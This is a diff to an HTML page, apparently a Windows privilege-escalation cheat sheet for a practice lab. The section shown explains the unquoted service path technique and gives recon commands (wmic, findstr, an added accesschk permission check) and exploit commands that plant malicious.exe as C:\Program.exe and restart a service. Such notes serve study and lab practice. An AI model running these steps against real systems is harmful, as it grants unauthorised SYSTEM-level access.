@@ -62,7 +62,9 @@ footer{max-width:920px; margin:0 auto; padding:8px 16px 40px; color:var(--muted)
 <p class="lbl">Why it works</p>
 <p class="note">A service path with spaces and no quotes makes Windows try each space-separated segment as an executable in order. If you can write to an early segment's folder, your planted .exe runs as the service account (often SYSTEM).</p>
 <p class="lbl">Recon</p>
-<pre><code>wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """</code></pre>
+<pre><code>wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+#check permission for read & write
+C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" </code></pre>
 <p class="lbl">Exploit</p>
 <pre><code>copy malicious.exe "C:\Program.exe"
 sc stop VulnSvc & sc start VulnSvc</code></pre>
